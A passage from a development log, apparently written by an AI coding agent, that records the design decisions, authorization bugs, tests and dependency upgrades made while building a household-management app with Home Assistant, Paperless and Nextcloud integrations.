### Attention gained a genuinely new kind of reason

"Trip readiness" is not overdue-ness. Nothing is late, and the date has
not passed — the window to act is closing. `UNVERIFIED_FACTS` and
`PREPARATION_INCOMPLETE` fire only inside a 21-day window, seven times
longer than "due soon", because the things that cannot be fixed late need
weeks. An unanswered access question outranks an unpacked bag: a bag can
be packed the night before, and a hotel cannot grow a lift.

`PreparationContext` says nothing about trips, so the rules module stays
aggregate-agnostic — the property that let reimbursements reuse the
waiting rules in Phase 5 with no new rule at all.

### An authorization bug the tests found, not the reasoning

`docs/permissions.md` gives a CHILD a "participant-safe view" of trips.
The first draft scoped a trip item that names nobody to *nobody*, and the
policy kernel gives a CHILD only what is explicitly scoped to them. The
result: a child on the trip could see that it existed and **not one line
on it** — the participant-safe view exactly inverted.

The fix is `tripItemScope()`: an item naming a person is scoped to that
person (because "Lukas needs a step-free bathroom" is narrower than the
trip and health-adjacent); an item naming nobody inherits the trip's
participants. One function, used by both the read and the write path, so
the two cannot drift.

A second consequence, also found by a failing test and now documented
rather than patched over: **a trip with no participants is invisible to
every child in the household.** That is the correct reading of CLAUDE.md
§5 rather than a gap — a trip nobody has been added to is a trip nobody
has been told they are going on — so the form says so where the
participants are chosen, instead of the rule being a surprise.

### Counts agree with lists

Readiness is derived from the items a reader is actually allowed to see,
so the summary and the list underneath always match. Same rule as the
finance totals, same reason: a count including rows the page refuses to
show is a disclosure by arithmetic.

### A test that was passing for the wrong reason

The E2E helper asserted `getByRole("heading", { name: title })` after
clicking into a trip. The list renders each title as an `h2` wrapping the
link, so that assertion was already satisfied *on the list page* — it
never waited for the navigation at all, and the next assertion then
matched six cards instead of one. It now anchors on the detail page's
`h1`, which only exists there. Worth recording because the test was
green on the desktop project and only failed on mobile, where the timing
differs: a test that does not wait for what it claims to wait for is a
test that fails somewhere else, later, for no visible reason.

### Verified

`tsc --noEmit`, `eslint .`, 406 unit and integration tests, `next build`,
and 103 E2E tests (2 skipped by project gate) against the standalone
bundle. The trip detail page has its own horizontal-overflow guard inside
the journey, because it is the busiest page in the app and lives behind a
dynamic route the page-level loop cannot reach.

### Not done in Phase 6a

- **Assets, warranties and maintenance** — vertical slice 7, the other
  half of this phase.
- **"Stale external verification"** from product-spec.md. Requirements
  record `verifiedOn`, so the data exists, but no staleness window is
  enforced: there is no evidence yet of what window matters, and a guessed
  one would either nag or lull. The unanswered case is the one that bites,
  and it is covered.
- **Trip-linked deadlines, expenses and documents.** The domain model
  allows a deadline to point at a trip; doing it well needs the same
  generic linking work Phase 3 deferred.

---

## Phase 6b: Assets, warranties and maintenance

Vertical slice 7, which completes Phase 6. **ADR-017** records the
decisions; `docs/domain/state-machines.md` now has an Asset section whose
content is that there deliberately is no state machine.

### The decision was not to add one

The last three slices each added a state machine, and the reflex to add a
fourth was the thing to resist. Cases, trips and claims have one because
each is a *process* the household is working through, where the legal next
steps are the point. A washing machine is not a process: it is owned, and
then one day it is not — sold, broken, given away — which is a single fact
with a date.

`PLANNED/ACTIVE/RETIRED` would have produced states nobody transitions
deliberately and which drift the moment someone forgets. The test now
written down is: **does a human ever have to decide which state it should
be in next?** For an asset the answer is no, so `disposedOn` records the
only transition there is.

### Cover ending is not a deadline, and the difference is in the data

An asset carries two dates in two different fields, on purpose:

- `dueOn` — the next service. Something is **owed by** that date, so it
  can be overdue, and it should keep being said until it is done.
- `expiresOn` — when the warranty runs out. A protection **ends on** it,
  the useful moment to act is *before*, and once it has passed there is
  nothing left to do.

Hence a new reason code `COVER_ENDING` with its own **30-day** window, and
— unlike `OVERDUE` — it **goes silent once the date passes**. A list that
keeps mentioning last year's warranty is a list people stop reading.

The field is `expiresOn`, not `warrantyEndsOn`: the same shape fits a
passport, a permit or an insurance policy, so the rules module stays
aggregate-agnostic. Three slices in, that property has now paid for itself
three times.

### Sensitivity is decided by category

`MEDICAL` and `MOBILITY` assets are raised to `SENSITIVE` automatically; a
wheelchair or a nebuliser in the list says something about a household
member's health, and a dishwasher says nothing about anybody. Deciding it
from the category rather than asking makes the safe answer the automatic
one — the same argument that made every expense `SENSITIVE` by default.

### Two derived answers that could each have been wrong

- **Next service due** comes from the *most recent* record, not the
  earliest outstanding `nextDueOn`. Each service supersedes the plan the
  one before it set, so a machine serviced early in March is not still due
  February's predicted date. Same-day ties go to the record entered last,
  because that means somebody corrected the first.
- **Cover ends** is the *latest* end date across warranties. Two
  overlapping covers leave the household protected until the later one
  runs out, and warning them when the shorter lapses would be crying wolf.

### The permissions matrix distinguishes assets from trips, and so does this

`docs/permissions.md` gives a CHILD "explicit" access to assets, where
trips get a "participant-safe view". Those are genuinely different, and
the difference is honoured rather than smoothed over: a child sees assets
scoped to them personally and **not** the household's own things. So no
scope inheritance here, unlike `tripItemScope()` in the slice before.

A first draft of the test asserted a child could see the household
dishwasher. The kernel refused it, and the kernel was right. Worth
recording because the previous slice's equivalent surprise went the *other*
way — there the kernel was right and the surrounding code was wrong. The
lesson is the same either way: when the kernel and an expectation
disagree, the matrix decides, not the intuition.

### An empty card, found by looking

The asset detail page rendered an empty bordered box whenever an asset had
none of its optional fields filled in — every field on that card is
optional, so with a bare name it was a card that said nothing. Not
something a type checker, a lint rule or an axe sweep has any opinion
about, and not something any of the seven passing E2E tests noticed. It
took opening the page.

### Verified

`tsc --noEmit`, `eslint .`, 449 unit and integration tests, `next build`,
and 121 E2E tests (2 skipped by project gate) against the standalone
bundle. The asset detail page carries its own horizontal-overflow guard,
as the trip detail page does, because both live behind dynamic routes the
page-level loop cannot reach.

### Not done

- **Linking an asset to the expense that bought it**, or to a case about a
  failed repair. Both want the generic linking work Phase 3 deferred, and
  doing either ad hoc would mean a third bespoke join table.
- **`disposeAsset`'s version check is unreachable sequentially**, because
  `ALREADY_DISPOSED` is checked first — which is the right order, since
  "this is already gone" tells the household more than "someone else
  changed it". It still earns its place against two *simultaneous*
  disposals, and the test exercises exactly that rather than pretending
  the sequential case proves anything.

---

## Phase 6 complete

Both vertical slices of Phase 6 are done. The remaining phases are 7
(integrations: Paperless, Nextcloud, Home Assistant, calendar providers)
and 8 (AI), which CLAUDE.md §17 gates behind "authorization, audit and
provenance foundations are proven".

---

## Phase 7a: The Home Assistant projection

The first integration, and the one with the sharpest edges: CLAUDE.md §10
is the most prescriptive section in the whole brief, and it is
prescriptive about what must **not** cross the boundary. **ADR-018**
records the decisions.

### The projection is deliberately narrower than the brief allows

§10 permits the summary to include "today, next deadlines, family events,
upcoming trip". This implementation carries **no free text at all** —
counts and dates only. No titles, no names, no destinations, no amounts.

The reason is that §10's own prohibition cannot otherwise be enforced.
Every title in this application is user-authored. A household that writes
"Lukas — oncology follow-up" as a task title has no way to know that
string will be rendered on a tablet in the hallway, where visitors, carers
and the children themselves can read it. No classifier can reliably decide
whether a free-text field contains a health detail, and a rule that
depended on one would fail quietly in exactly the cases that matter most.

So the guarantee is structural rather than procedural: `HouseholdGlance`
contains integers and date strings, and an integration test asserts that
every value in it is a number, a date-shaped string, or null — with
deliberately sensitive records (an oncology task, a benefits case, a
health expense) in the database at the time.

This is the first place in the project where I have shipped **less** than
the specification permits. It is worth being explicit that this was a
choice and not an omission: the household loses some glanceability and
gains a property that can be tested rather than trusted.

### Counts include sensitive items; that is the line

A count carries no content. "Three things need attention" reveals nothing
about what they are, and a badge that quietly under-reported because two
were medical would defeat the point of having one. **Aggregate over
everything, disclose nothing.**

### Two doors, two credentials, and a third option refused

- `GET /api/ha/summary` — a machine. Bearer token in a header, compared in
  constant time on SHA-256 digests so neither the value nor its length
  leaks, minimum 32 characters, and **failing closed when unconfigured**:
  an unset token returns 503 rather than opening the endpoint.
- `/ha` — a tablet. An ordinary session.

The tempting third option, a token in the dashboard card's URL, is
refused and tested against. A secret in a URL ends up in the reverse
proxy's access log, the browser's history and every screenshot of the
dashboard.

The endpoint is in the proxy's public-route list — a machine asking for
JSON should not receive a 307 to an HTML sign-in page — which makes the
token check the only thing in front of it, and is why that route file is
short and does nothing else.

### A test of mine that passed for the wrong reason

`checkHaToken(presented, configured)` originally defaulted `configured` to
`process.env.HA_READONLY_TOKEN`. The "fails closed when nothing is
configured" test passed `undefined` — which, against a defaulted
parameter, means *use the default*, not *nothing is configured*. It passed
only because the local dev token happened to be 19 characters, below the
minimum.

It surfaced the moment the dev token was lengthened so the E2E happy path
would actually run: two security tests flipped to failing, in a file that
had passed in isolation minutes earlier.

The fix is the better design anyway: the parameter is now required, and
the route reads the environment. That matches how every other rule in this
codebase takes its clock and its timezone as arguments rather than reading
them. A security check whose test cannot distinguish "unconfigured" from
"configured with something else" is not a security check.

While fixing it, `.env.example`'s placeholder also turned out to be
shorter than the code accepts — which would have produced a 503 that
looked like a bug rather than the refusal it is. It now states the minimum
and how to generate one.

### Verified

`tsc --noEmit`, `eslint .`, 472 unit and integration tests, `next build`,
and 137 E2E tests (2 skipped by project gate) against the standalone
bundle — plus the endpoint exercised directly with a correct token (200
and the expected shape), no token (401) and a wrong token (401).

### Not done

- **Provider adapters** — Paperless, Nextcloud, calendar providers — which
  are the rest of Phase 7. They need `IntegrationConnection` and `SyncRun`
  from the domain model, and, more seriously, somewhere to keep an
  external credential: CLAUDE.md §7 forbids storing long-lived external
  secrets in ordinary domain tables, so that is a design decision of its
  own before any adapter is written.
- **`frame-ancestors`.** The CSP does not name Home Assistant's origin, so
  a Webpage card may refuse to embed `/ha`. Permitting one known origin is
  a per-deployment decision;
  `docs/integrations/home-assistant.md` says not to weaken security
  globally, so nothing is weakened here.
- **Rate limiting on the endpoint.** The token is the control and the
  surface is a LAN. Worth revisiting if the app is ever exposed beyond
  one.

---

## Phase 7c: Provider adapters, sync runs and document references

Vertical slice 8, built on the credential vault from 7b. **ADR-020**
records the decisions.

### A bug my own test caught, in the code I had just written

The integration test asserting "a token never reaches a sync run" failed
on its first run. `describeFailure` stored `error.message.slice(0, 300)`,
and the Paperless adapter had interpolated the underlying fetch error into
its own message — and an underlying fetch error routinely names the URL it
was called with, and a URL can carry a credential.

What makes this worth recording is that I had already written a comment in
the adapter's own test claiming the sync command "stores a classified kind
and a bounded message rather than whatever came back". It did not. The
comment described the design I intended; the code did the opposite; only
the test knew.

Fixed at both ends, deliberately: the adapter now classifies without
echoing the cause, and the driver ignores the message entirely in favour
of a fixed table of this application's own words. Either fix alone would
have passed the test. Both are there because the failure mode is a
credential in a database column that is rendered in the UI and kept
indefinitely.

### `PARTIAL` is the whole reason a sync run is a state machine

A run that imported eleven documents and choked on the twelfth has done
real work **and** has not finished. Calling it success loses the error;
calling it failure re-imports eleven documents and makes the counts
meaningless. So pages are imported one transaction each, the cursor
advances per page, and a failure after progress ends as `PARTIAL` with the
progress and the error stored together.

A failed run does **not** advance the cursor — nothing about where it
stopped can be trusted. And a run that imported nothing cannot be called
partial: that is a failure wearing a friendlier name, and it would advance
the cursor past documents nobody has seen. The domain refuses it.

### "Never silently overwrite local edits" is a schema decision

`docs/domain/state-machines.md` states that rule in prose. It is enforced
by making provider-owned and household-owned fields **different columns**:
`title` is Paperless's and a sync overwrites it; `titleOverride` and `note`
are the household's and a sync cannot reach them.

No dirty flag, no last-writer-wins comparison, no timestamp race — the
question never arises. The alternative (one `title` plus a flag) fails the
first time somebody edits through a path that forgot to set it.

Idempotency is the same kind of decision: a unique index on
`(household, provider, externalId)` makes re-running a page an update
rather than a duplicate, whatever the adapter does.

### The adapter distrusts the provider

Every field is checked rather than destructured; a malformed row is
skipped rather than becoming a reference with `undefined` in it. The
document URL is **built from the configured base**, never taken from the
response — a URL from a provider would be an open redirect, and these are
links the household clicks. `isSafeDocumentUrl` rejects anything but
http(s), at import and again at render, because a row could predate the
check.

OCR text is never read, and `truncate_content=true` asks Paperless not to
send it — `docs/integrations/integration-contracts.md` says so, and it is
also megabytes per document.

### Integrations are the strictest permission in the app after Audit

`docs/permissions.md` gives them to Owner/Admin only — "none by default"
even for an adult. `authorizeIntegrationAccess` deliberately does not
delegate to `canAccess`, because an `ADULT` falls through its role
branches to `true`. Delegating would hand every adult the ability to point
a connection at a new base URL and store a credential under it, which is
configuration of where the household's data goes rather than use of it.

### Verified

`tsc --noEmit`, `eslint .`, 561 unit and integration tests, `next build`,
and 161 E2E tests (2 skipped by project gate) against the standalone
bundle — including an end-to-end sync against an unreachable host, which
proves the failure path reports in the app's own words and records itself
where "is this working?" can be answered from it. The rendered page was
also checked directly for the token: absent from the HTML, and the field
is `type="password"`.

### A dev-environment trap worth writing down

Running `next build` while `next dev` is serving leaves a `.next` that the
dev server then reads as authoritative, and every route 404s. It cost time
twice in this session before I recognised it. It is not a product bug —
the production build and the whole E2E suite were fine throughout — and
the fix is `rm -rf .next` and restart. Worth knowing because the symptom
(every page 404s, including `/login`) looks exactly like something
catastrophic.

### Not done

- **Nextcloud and CalDAV adapters.** A connection can be configured for
  either and refuses to sync with `NO_ADAPTER`, which is clearer than a
  run that silently imports nothing.
- **Scheduled and automatic-retry syncs.** `FAILED -> RETRYING -> RUNNING`
  exists in the machine and is tested, but nothing drives it; the
  household presses the button. Both need a backoff policy per error kind
  and belong with the existing reminder worker (ADR-013).
- **Linking a document to a case, expense or trip.** This is the
  "context links" half of the integration contract and the generic linking
  work deferred since Phase 3. It is now the most-deferred item in the
  project and should be the next thing built.
- **Manual document references.** Supported by the schema, no UI.

---

## Context links: the most-deferred item, finally built

`docs/domain/erd.md` has modelled `CASE contextualizes DOCUMENT_REFERENCE`
since Phase 0, and the same need appeared in every phase since — an
expense that belongs to a case, a document that justifies a claim, a trip
a booking confirmation belongs to. It had been deferred since Phase 3.
**ADR-021** records the decisions.

### The rule that matters

**A link is visible only if the actor may read the record at the *other*
end** — not the one they are looking at.

Without that, linking is a side door around every sensitivity rule in the
application: a `NORMAL` case linked to a `SENSITIVE` document would tell a
child account that the document exists and what it is called, which is
most of what the sensitivity was protecting. `resolveRecords` runs every
far end through the policy kernel with the same inputs that record's own
list query uses, and an unresolved end is simply not returned.

Creating and removing a link require the same, and an unreadable record is
reported as **not found rather than forbidden**: for the far end of a
link, a refusal that distinguishes the two is a way to test whether
something exists.

### A bug caught before it could exist

Storage is canonical — the pair is sorted into a fixed order so "document
linked to case" and "case linked to document" are one row and a unique
index can prevent duplicates.

The first version sorted by comparing type names as strings. PostgreSQL
compares enum values by **declaration order**, and the table has a `CHECK`
enforcing canonical ordering — so the two would have disagreed for any
pair whose alphabetical and declared orders differ. `task` and `expense`
are exactly such a pair, and every task-expense link would have been
rejected by the constraint with an error nobody would have connected to
sort order.

I noticed it while writing the comment claiming the two agreed. Ranking by
index into `LINKABLE_TYPES` makes them the same definition, and a test
walks every pair of types asserting the TypeScript order matches the
declared one.

### Two UI defects, fixed at their source

Both were found by the case detail page's own horizontal-overflow guard,
on mobile only, and neither is specific to links:

- **`TextField.module.css` gave fields no `max-width`.** A `<select>`
  sizes itself to its widest option, so a long record description in the
  link picker pushed the page 24px past a 412px phone. Every select in the
  app — finance categories, trip participants, asset categories,
  integration providers — had this latent; none had an option long enough
  to expose it.
- **The unlink button rendered the full record name**, so a screen reader
  would hear which of several it removes rather than five identical
  "Unlink" buttons. That made the button 395px wide. It now shows "Unlink"
  and carries the full name as its accessible name, which still satisfies
  WCAG 2.2 SC 2.5.3 because the accessible name begins with the visible
  word.

The first fix only moved the overflow from 24px to 22px, which is what
prompted actually measuring rather than guessing again — a throwaway probe
that walked the DOM and reported every element extending past the viewport
found the button in one run.

### Verified

`tsc --noEmit`, `eslint .`, 588 unit and integration tests, `next build`,
and 169 E2E tests (2 skipped by project gate) against the standalone
bundle.

### Not done

- **Linking from anywhere but a case.** The mechanism is type-agnostic, so
  adding it to a trip, an asset or a claim is a section on that page
  rather than new schema.
- **Search.** The picker is bounded per type and recent-first, which is
  right for "the thing I was just looking at" and wrong for a household
  with three years of documents. Screen 44 in the inventory is Search, and
  it is now the obvious next gap.

## Global search: the last experience-layer view

`docs/design/screen-inventory.md` §4 lists Global search among the three
screens that exist before any feature does, and
`docs/requirements/product-spec.md` puts it under Retrieve: "Global search
and contextual links make information discoverable". Links landed first;
this is the other half. **ADR-022** records the decisions, implementing
ADR-003's "start with PostgreSQL full-text search" — which chose the
technology in one sentence and left every real question open.

### The index is a generated column

Seven tables gained

```sql
search_vector tsvector GENERATED ALWAYS AS (to_tsvector('simple', …)) STORED
```

and a GIN index, in migration `0011`.

The alternative was a `search_document` table this application writes, or
a trigger, or an outbox-driven reindex — a second copy of the truth, and
every copy needs a story for what happens when the two disagree. A
generated column cannot disagree with its row. A title corrected by a
form, an importer, a sync run or somebody's `psql` session is searchable
immediately and by construction, and there is no reindex job to run,
remember after a migration, or monitor.

### `simple`, and what it costs

A generated column's expression must be immutable, so the text search
configuration has to be named in the DDL, and naming one means choosing.
This household writes German and English in the same sentence
("Pflegegrad appeal"). `german` stems German and mangles English;
`english` does the reverse. Either would quietly degrade half the
household's own data — and quietly is the problem, because nobody ever
sees why a search missed.

`simple` stems nothing: it folds case, splits on word boundaries, and
stops. That means "Antrag" does not find "Anträge", and "Muller" does not
find "Müller". The second is asserted by a test so it is documented
behaviour rather than a surprise report. The fix, if the household
actually minds, is `unaccent` plus a language-tagged second column —
additive, and better decided from complaints than in advance.

### `websearch_to_tsquery`, because a search box must not 500

`to_tsquery` raises a syntax error on `a & | b`, an unclosed quote, a
trailing operator, a bare `-` — all things a person types. From a search
box that means the page fails because somebody typed.
`websearch_to_tsquery` never raises and understands the syntax people
already know: quoted phrases, `or`, `-` to exclude. Seven such inputs are
asserted not to throw.

### The security decision: search never holds a title

Same rule as links, and for the same reason: **a record appears in results
only if the actor may read it.** A result list showing titles the reader
cannot open is an enumeration channel for precisely the records a
sensitivity level protects, and for most records the title *is* the
disclosure — "Consultant's letter" tells a child most of what was being
protected.

What makes this structural rather than careful is that
`application/queries/search/search.ts` selects **only ids and ranks**. It
never reads a title, description, note or merchant. It hands the bare ids
to `resolveRecords` — the same function links use — which is the one place
that decides what a record is called and whether this actor may see it.

Search therefore cannot leak a title, because it never has one. And search
cannot drift away from links, because they are not two implementations of
one rule; they are one implementation.

Withheld rows are absent, with no count: "3 results you may not see" is
itself the disclosure, and a test asserts the result object has no such
field.

### A real authorization bug, found by building on top of it

Concentrating both features on `resolveRecords` is the point, and it is
also a standing hazard: a defect there is now a defect in both. Building
search found exactly such a defect.

Tasks and cases keep their person scope in a join table (`task_person`,
`case_person`) rather than a column, and `resolveRecords` was not loading
it. Its own docblock claimed each branch passed "the people it is about".
It did not.

For a `CHILD` that fails safe — the kernel requires explicit scoping, so
missing scope means deny. For an `ADULT` or `VIEWER` it fails **open**:
`canAccess` enforces person scope only when it is given some, so a case
about one household member was readable through a link by an adult whom
the cases list hides it from. Search would have multiplied that from "a
link somebody already made" to "type a word".

Fixed, and the regression test was confirmed to fail without the fix
rather than being taken on trust:

```
AssertionError: expected [ { type: 'case', …(4) } ] to deeply equal []
```

### The page is a document

`/search?q=…` is a plain `<form method="get">` — no Server Action. Three
consequences, none incidental:

- It works before hydration and with JavaScript off entirely. Every other
  form in this app had to be taught to disable itself until React takes
  over (`useHydrated`, the app-wide dead-click bug from Phase 5); a GET
  form needs no rescue because the browser submits it. A Playwright
  context with `javaScriptEnabled: false` asserts this.
- The back button and bookmarks behave. A result list is a place and
  should have an address.
- There is nothing on the page that could mutate.

The term does land in the URL, against CLAUDE.md's rule about sensitive
data in URLs. The judgement, recorded in both ADR-022 and
`docs/security/security-model.md`: a search term is the household's own
words rather than a record's contents, the address never leaves their own
machine, and the one place this application writes a URL is the request
log, which records `pathname` and never the query string. **If that ever
changes, `/search` must become a POST-and-redirect** — written down
because nothing else depends on that property, so it could be broken
without anyone noticing.

### One UI defect, found by looking

`resolveRecords` returns the raw column as a result's second line, and for
cases, tasks and claims that column is a status enum. The first render of
the page showed a case as **`ACTIVE`** — untranslated, shouty, and a
different word from the "Open" the cases list shows for the same record.
Nothing in the test suite objects to a string being wrong; it was visible
in the first screenshot. The page now translates through the same message
keys each record's own page uses, and dates through the same midday-UTC
formatting the calendar uses so a `DATE` cannot render as the day before.

### Verified

`tsc --noEmit`, `eslint .`, 610 unit and integration tests (22 new),
`next build`, and 185 E2E tests against the standalone bundle (2 skipped
by project gate) — 12 new search journeys across the desktop and mobile
projects, plus axe checks on both the empty and the populated state and a
horizontal-overflow guard on `/search`.

### Not done

- **The command palette** (screen 5). Search is a page; a keyboard-first
  overlay is a different interaction and a larger piece of work.
- **Stemming and diacritic folding**, deliberately — see above.
- **Searching notes, timeline entries and trip items.** Adding an
  aggregate to search is a migration plus one more `matchIds` call, so
  this is cheap when somebody misses it.

## The retry policy that nothing enacted

`docs/domain/state-machines.md` has contained `FAILED -> RETRYING ->
RUNNING` since Phase 0. ADR-020 implemented that machine and tested every
transition in it. `CLAUDE.md` §9 requires every adapter to define a retry
policy.

All of that was true and none of it did anything. The only thing that
could move a run through the machine was a person pressing "Sync now".
`RETRYING` was a state no code outside a unit test had ever written. An
integration that failed at 2am stayed failed until somebody noticed.

This is worth naming as a category rather than a bug: **an implemented,
tested state machine with nothing driving it looks exactly like a working
feature** — green tests, a documented policy, a state column that has all
the right values in it. Nothing in the suite was wrong. The question
nobody had asked was "what calls this?". **ADR-023** records the answer.

### Scheduling, and the decision not to have an actor

One new nullable column, `sync_interval_minutes`, defaulting to NULL —
manual only. A migration must not quietly start making outbound requests
to somebody else's server for a household that never asked. The floor is
15 minutes, enforced in the command, in a `CHECK`, and in the UI, which
offers fixed choices rather than a number field that would invite "5" and
then refuse it.

The scheduler takes no `Actor` and checks no permissions, which needs
defending rather than glossing:

- There is no user here. Inventing a "system user" would put a name in the
  audit trail belonging to nobody, and a fabricated actor is worse than an
  absent one.
- `runScheduledSync` and `retrySyncRun` are unreachable from any route or
  Server Action. Their only caller selects connections by the household's
  own stored interval; neither can be aimed at a connection by a request.
- The household authorizes this **once**, by setting the interval — and
  that command does check permissions, owner or admin, and audits who gave
  the instruction.
- Every scheduled run is audited with `actorUserId: null` and
  `metadata.trigger` of `SCHEDULE` or `RETRY`. "Nobody" and "the schedule"
  are different answers and the trail now carries both.

### A run claims its connection by existing

```sql
CREATE UNIQUE INDEX sync_run_one_live_per_connection_uq
  ON sync_run (connection_id)
  WHERE status IN ('PENDING', 'RUNNING', 'RETRYING');
```

Not a row lock: a sync makes network calls across up to ten pages, and
holding a transaction open for that is what the rest of this codebase
exists to avoid. So the claim is the row. A second scheduler tick, a
rolling restart running two containers, or a person pressing "Sync now"
during a scheduled run all collide here and lose, rather than racing over
one cursor. Postgres checks unique indexes on UPDATE too, so the retry
path — where a `FAILED` row *becomes* live — is covered by the same
constraint.

An unreleased claim would wedge the connection forever, so a live run
older than twenty minutes is reaped to `FAILED` with
`error_kind = 'abandoned'` — distinguishable from "the provider refused
us", and retryable, because the work still needs doing.

### A defect the first integration test caught

Translating the constraint violation into a friendly rejection needs the
error's `cause` chain walked: Drizzle wraps driver errors, and the
`PostgresError` carrying SQLSTATE 23505 sits one level down. My first
version checked only the top-level `code`. It compiled, read correctly,
and produced this on its first run:

```
expected DrizzleQueryError { … "cause": PostgresError { "code": "23505" } }
      to match { name: "IntegrationRuleError", code: "ALREADY_RUNNING" }
```

Without the test it would have shipped as a raw constraint violation — a
500 — the first time two syncs overlapped, which is precisely the
situation the index was added to handle gracefully.

### Two text problems found by looking, not by testing

Both in the schedule UI, both invisible to a green suite:

- **"Only when asked"** read fine as a dropdown option and as a fragment
  under a URL in the card summary. It was also, literally, the same string
  in both places — which a Playwright locator resolved to two elements and
  refused. That ambiguity was the signal: the summary now says "Syncs only
  when asked", a sentence, parallel to the set state.
- **"Syncs by itself every 1440 minutes"** is what the column says and
  nobody's idea of a daily sync. The unit now follows the number: hourly,
  every N hours, once a day.

### Verified

`tsc --noEmit`, `eslint .`, 649 unit and integration tests (39 new: 22
pure scheduling rules, 17 against a real database covering backoff, the
attempt ceiling, reaping, and three ways two syncs could have raced),
`next build`, and 191 E2E tests against the standalone bundle (2 skipped
by project gate), with the integrations journey extended to 21. The phone
layout of the new schedule control was looked at, not assumed.

### Not done

- **Nextcloud and CalDAV adapters.** The driver is provider-agnostic and
  the scheduler is entirely so; what is missing is two `DocumentProvider`
  implementations. A connection to either is refused with "there is no
  adapter for that system yet" rather than failing confusingly.
- **A "retry this now" button.** The scheduler will get to it, and a
  manual "Sync now" already starts a fresh run. If one is added it must go
  through an authorizing command, which ADR-023 says explicitly.
- **Alerting on a connection that has exhausted its attempts.** It is
  visible on the integrations page and in the log, which is the same
  standard the outbox's terminal `FAILED` holds itself to. A notification
  would be the better answer and is cheap now that the state exists.

## Nextcloud: a second provider, and a design-system bug it uncovered

`docs/integrations/integration-contracts.md` on Nextcloud, in full:
"Purpose: file links and optionally selected attachment storage. **Do not
mirror the full Nextcloud tree.**" **ADR-024** records how that sentence
became the design.

### One folder, keyed on the file id

A connection names one account and one folder; the listing is `Depth: 1`
and subfolders are recognised and skipped. A household wanting two folders
makes two connections, which also gives them two health rows and two
schedules.

The identity is `oc:fileid`, not the path. That is the decision the whole
sync's idempotency rests on: a file id survives a rename and a move, so
renaming a document in Nextcloud *updates* the household's reference and
keeps their note and title override attached. Keying on the path would
have created a second reference and orphaned the first — which the
household would have experienced as their own notes silently detaching
from their documents, with no error anywhere. Asserted in both the unit
and the integration suites.

`username` and `remote_path` are ordinary columns, not sealed values: an
account name is not a secret, and the WebDAV path is per-account, so it is
part of the address. Both become URL path segments, so both are
constrained in three places — the command, a `CHECK`, and per-segment
encoding — and a `..` is refused rather than resolved.

### The multistatus reader, and why it is not an XML parser

Hand-written, for two reasons. The ordinary one is that it reads one
constrained document and takes four leaves out of each entry — the same
call the project already made for CSV.

The interesting one: **it does not resolve entities, and cannot.** No DTD
handling, no external entities, no expansion — so XXE and billion-laughs
are not mitigated here, they are absent. A general parser would have to be
configured into that position and stay configured across upgrades. Both
attacks are in the tests, asserting that nothing whatsoever happens.

What that costs has to be said plainly, and is said in the file itself:
this is not an XML parser and must never be described as one. It matches
local names and does not understand namespaces, comments or mixed content
properly. The mitigation is strictness plus tests against what a real
Nextcloud sends — the folder as the first entry, the second `404` propstat
whose empty elements would otherwise overwrite good values, other
namespace prefixes, entity-escaped and percent-encoded filenames, CDATA,
and an unterminated entry that must not take the rest of the listing down.

### A design-system bug, found by a test that would not go green

The new validation ("Nextcloud needs an account") made a rejected connect
form reachable for the first time, and the E2E test that filled in the
missing field and resubmitted kept failing for reasons that made no sense.
Driving it by hand in a browser found two layers:

**React 19 resets an uncontrolled form once its action completes**, error
or not. So a rejected submit erased the address, the display name and the
folder along with showing the error — pre-existing, and true of every
failed attempt on that page since it was written. Fixed by handing the
typed values back in the action's state. The token is deliberately *not*
among them: echoing a credential would put it into the rendered HTML,
which this page has been careful about since it was written, so the form
says it was not kept and asks again.

**And underneath it, a worse one.** Handing values back restored every
text field and silently reverted every `<select>`. React maps an input's
`defaultValue` onto its `value` attribute, which survives the reset; a
`<select>` has no such attribute, its default lives in which `<option>`
carries `selected`, and React sets that at mount only.

On this page that meant a rejected Nextcloud connection came back with the
provider quietly switched to Paperless. Submit again and the household
would have got a different kind of connection from the one they asked for,
with nothing indicating anything had changed. Fixed in `SelectField`, so
every select in the application is covered rather than this one form, and
asserted in the E2E.

Neither was visible in a green suite. The first surfaced only because a
test kept failing in a way that did not match the code; the second only by
reading the actual DOM values after a failed submit.

### Verified

`tsc --noEmit`, `eslint .`, 697 unit and integration tests (48 new: 16 for
the multistatus reader, 20 for the adapter, 12 end-to-end through the real
adapter with only `fetch` stubbed), `next build`, and 197 E2E tests across
desktop and mobile with the integrations journey now at 27.

One pre-existing test needed changing: it created a Nextcloud connection
with no account, which the new rule correctly refuses. The rule is right
and the test predated it.

### Not done

- **CalDAV.** Still configurable and unreadable, and says so. Calendar
  sync is a different shape from document sync — two-way, with a conflict
  policy — and belongs with the calendar module rather than bolted onto
  the document provider port.
- **Incremental listing.** A `REPORT` with `sync-collection` (RFC 6578) is
  the right answer for a large folder. Until a household has one, the 8 MB
  and 5,000-entry caps fail loudly rather than degrading quietly.
- **Attachment storage**, the "optionally" half of the contract's
  sentence. Reading links is the useful half and the safe one.

## Dependency and container scanning, and what building the image found

CLAUDE.md §12 lists "dependency and container scanning" among the Phase 1
security baseline. It has been outstanding since Phase 1 — the longest-open
item in the project — and closing it turned out to be worth more than a
tick in a checklist.

### The dependency gate found a high advisory on its first run

`pnpm audit` immediately reported **GHSA-gpj5-g38j-94v9: SQL injection via
improperly escaped SQL identifiers in drizzle-orm < 0.45.2**. The project
pinned `^0.44.0`.

This application is very unlikely to have been exploitable — identifiers
come from schema objects, never from user input, and every value goes
through a parameterised `sql` template. But "probably not reachable" is a
reason it was not urgent, not a reason to stay on a vulnerable version of
the library that touches every query in the app. Upgraded to 0.45.2; 697
tests pass unchanged.

Three moderates followed, all in dev tooling:

- **vitest / @vitest/mocker** path traversal, needing ≥ 4.1.11. Upgraded
  to 5.0.0, which removed `poolOptions`; the integration project's
  `singleFork` became `fileParallelism: false` — a better spelling anyway,
  since the requirement is "do not run these files at the same time", not
  "use one fork". Without it the integration files ran in parallel against
  one database and 243 tests failed on unique-key collisions, which is a
  clear demonstration of what that setting was doing.
- **esbuild** via drizzle-kit's deprecated `@esbuild-kit/esm-loader`, with
  no upstream fix — drizzle-kit is already at its latest. Resolved with a
  pinned `pnpm.overrides` entry forcing esbuild ≥ 0.25, verified by
  running `drizzle-kit check` and `generate` afterwards.

`pnpm audit` now reports nothing at any severity.

### Building the image found three defects, because nobody had built it

The Dockerfile has existed since Phase 0. **It had never produced an
image.**

1. **It did not build.** `infrastructure/db/client.ts` threw at import time
   when `DATABASE_URL` was unset, and `next build` imports every route
   module to collect its configuration. So building required a live
   database URL — a runtime secret that a build stage has no business
